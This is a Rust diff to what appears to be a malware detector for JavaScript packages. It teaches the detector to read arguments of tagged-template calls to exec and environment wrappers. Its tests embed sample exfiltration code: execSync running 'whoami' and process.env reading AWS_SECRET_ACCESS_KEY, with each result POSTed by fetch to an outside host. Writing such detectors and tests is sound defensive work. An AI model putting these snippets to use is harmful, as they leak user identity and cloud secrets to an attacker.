@@ -3425,20 +3425,50 @@ impl<'p> Eval<'p> {
         }
     }
 
+    /// The constant text a call gives its callee's parameter `i` (None when it is not constant, or a spread
+    /// before it hides which argument it is). `apply` runs a function for a call, a `new`, and a tagged template,
+    /// whose arguments are no list of the node: the tag's first parameter gets the template's strings — read as
+    /// their text when the template is one piece (`` run`whoami` ``: a wrapper that joins or indexes them runs
+    /// it) —, the others its expressions. (Reading a tagged template's quasi as an argument list was the engine's
+    /// panic on @epoch32/visage 1.14.0's bundle, John's discovery run of Oct 18: tree.rs's `list` given a node id.)
+    fn sc_call_arg_text(&self, node: NodeId, i: usize) -> Option<PyStr> {
+        let arg = {
+            let a = self.a();
+            match a.kind(node) {
+                Kind::CallExpression | Kind::NewExpression => {
+                    let args = a.list(node, jt::B);
+                    if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
+                        return None;
+                    }
+                    *args.get(i)?
+                }
+                Kind::TaggedTemplateExpression => {
+                    let quasi = a.at(node, jt::B);
+                    if quasi == NONE || a.kind(quasi) != Kind::TemplateLiteral {
+                        return None;
+                    }
+                    let exprs = a.list(quasi, jt::B);
+                    if i == 0 {
+                        if !exprs.is_empty() {
+                            return None;
+                        }
+                        let q = *a.list(quasi, jt::A).first()?;
+                        return Some(a.s(q, jt::A).to_vec());
+                    }
+                    *exprs.get(i - 1)?
+                }
+                _ => return None,
+            }
+        };
+        self.sc_const_str(arg)
+    }
+
     /// A call of the script's wrapper of exec (its parameter `i` is the
     /// command line): what the command prints, when the call gives it as a
     /// constant.
     pub(super) fn sc_wrapper_output(&self, node: NodeId, i: usize) -> Option<V> {
-        let (arg, at, line) = {
-            let a = self.a();
-            let args = a.list(node, jt::B);
-            let arg = *args.get(i)?;
-            if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
-                return None;
-            }
-            (arg, a.0.nodes[node as usize].start, self.call_line(node))
-        };
-        let command = self.sc_const_str(arg)?;
+        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
+        let command = self.sc_call_arg_text(node, i)?;
         let sup = self.sup();
         let p = sup.p();
         if p.re("_LD_METADATA_RE").search(&command).is_some() {
@@ -3462,15 +3492,7 @@ impl<'p> Eval<'p> {
             return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
         }
         if cat == ENV_NAME {
-            let arg = {
-                let a = self.a();
-                let args = a.list(node, jt::B);
-                if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
-                    return None;
-                }
-                *args.get(i)?
-            };
-            let name = self.sc_const_str(arg)?;
+            let name = self.sc_call_arg_text(node, i)?;
             let v = self.sc_env_var(&name, at, line);
             return if v.tainted() { Some(v) } else { None };
         }
@@ -5682,6 +5704,31 @@ mod tests {
         assert_eq!(sent(&src), found("identity", "hostname"));
         let src = format!("const r = require;\nconst o = r('os');\nfetch('https://{}/c', {{ method: 'POST', body: o.userInfo() }});\n", HOST);
         assert_eq!(sent(&src), found("identity", "userInfo"));
+    }
+
+    #[test]
+    fn a_tagged_template_call_of_a_wrapper_reads_its_arguments() {
+        // The engine's panic on @epoch32/visage 1.14.0's bundle (John's discovery run, Oct 18): tagged() hands
+        // apply the TaggedTemplateExpression, and the wrapper readers read its quasi slot as a call's argument
+        // list, a node id as a list id (tree.rs's `list`, out of bounds once the tree holds more nodes than list
+        // slots: the statements before the call). The tag's first parameter is the template's strings, read as
+        // their text when it is one piece; the others are its expressions.
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        let pad: String = "0;\n".repeat(3000);
+        let exec = "const { execSync } = require('child_process');\n\
+                    function run(c) { try { return execSync(String(c)).toString(); } catch { return ''; } }\n";
+        let src = format!("{}{}{}", pad, exec, post("run`whoami`"));
+        assert_eq!(sent(&src), found("identity", "whoami"));
+        let src = format!("{}{}const w = 'who';\n{}", pad, exec, post("run`${w}ami`"));
+        assert_eq!(sent(&src), None); // (the strings with an expression between them: no constant command)
+        let env = "function getEnv(n) { return process.env[n]; }\n";
+        let src = format!("{}{}{}", pad, env, post("getEnv`AWS_SECRET_ACCESS_KEY`"));
+        assert_eq!(sent(&src), found("environment", "AWS_SECRET_ACCESS_KEY"));
+        let src = format!("{}{}{}", pad, env, post("getEnv`HOST`"));
+        assert_eq!(sent(&src), None);
+        // a call as before
+        let src = format!("{}{}{}", pad, exec, post("run('whoami')"));
+        assert_eq!(sent(&src), found("identity", "whoami"));
     }
 
     #[test]
